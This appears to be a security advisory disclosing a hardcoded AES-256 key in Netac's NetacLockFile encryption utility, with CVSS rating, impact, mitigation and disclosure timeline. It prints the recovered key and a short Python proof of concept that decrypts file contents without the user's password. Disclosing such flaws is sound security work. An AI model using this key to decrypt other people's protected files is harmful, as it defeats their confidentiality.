# Use of a fixed, hardcoded AES key (independent of user password) in Netac NetacLockFile

- **CVE ID:** CVE-PENDING *(requested; will be updated when assigned)*
- **Vendor:** Netac Technology Co., Ltd.
- **Product:** NetacLockFile file-encryption utility (`NetacLockFile.exe` v1.1.1.2), bundled with Netac encrypted USB flash drives
- **CWE:** [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
- **CVSS v3.1:** 5.4 (Medium) — `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- **Reporter:** Xusheng Li (independent research, not on behalf of any employer)
- **Status:** Reported to Netac on 2025-10-19; no vendor response and no fix as of publication.

## Summary

NetacLockFile is a file-encryption utility shipped with Netac encrypted USB drives, marketed as encrypting files under a user-chosen password.

In version 1.1.1.2, the part of the file that is encrypted uses AES under a **single fixed key hardcoded in the binary** — the same key for every user, file, and password. The user's password does not affect the key at all. Anyone with the (freely distributed) software can extract the key once and decrypt the encrypted portion of any file produced by any user.

## Technical details

The encrypted region is AES-encrypted (identifiable from the cipher's constants in the binary) with a 256-bit key that is a fixed constant in the program's `.rdata` section, not derived from the password. The key recovered from `NetacLockFile.exe` v1.1.1.2 is:

```
08090a0b0d0e0f10121314151718191a1c1d1e1f21222324262728292b2cffff
```

## Proof of concept

The encrypted region is AES-256 in ECB mode. The key is recovered once from the binary's `.rdata`; no password is needed. For example, the encrypted block `161ba6214bd28798a2d8848890008e3d` decrypts to readable plaintext:

```python
# pip install pycryptodome
from Crypto.Cipher import AES

key = bytes.fromhex("08090a0b0d0e0f10121314151718191a1c1d1e1f21222324262728292b2cffff")
ct  = bytes.fromhex("161ba6214bd28798a2d8848890008e3d")

pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
print(pt)  # b'earized 1/L 9596'
```

Encrypting any file with NetacLockFile under any password and decrypting the result with this same fixed key confirms the password has no effect on the encryption.

## Impact

Because the key is a fixed constant in the binary, the password provides no confidentiality: any attacker with the publicly available software can decrypt the encrypted portion of every file ever produced by the affected version. There is no per-user, per-file, or per-password key separation.

## Mitigation

No vendor fix is available. Treat files "encrypted" with the affected version as unprotected, and use a vetted file- or volume-encryption tool instead, until NetacLockFile derives its key from the user password with a sound KDF and a unique per-file salt and IV.

## Disclosure timeline

All dates are UTC.

| Date | Event |
|---|---|
| 2025-10-19 | Reporter sends report and proof of concept to Netac. |
| 2025-10-19 → | No acknowledgement, response, or patch from the vendor. |
| 2026-03-05 → 2026-03-07 | Publicly disclosed in the reporter's talk at RE//verse 2026 (Orlando, FL), after the 90-day window. |
| TBD | CVE ID requested; advisory will be updated when assigned. |

## Related work

Presented in the reporter's talk *Breaking Encrypted USB Drives* at [RE//verse 2026](https://re-verse.io/) (March 5–7, 2026, Orlando, FL). Recording: <https://www.youtube.com/watch?v=Rv6jdnQ4YhY>.

## Credit

Discovered and reported by Xusheng Li, in a personal capacity; this does not represent the views of the reporter's employer.
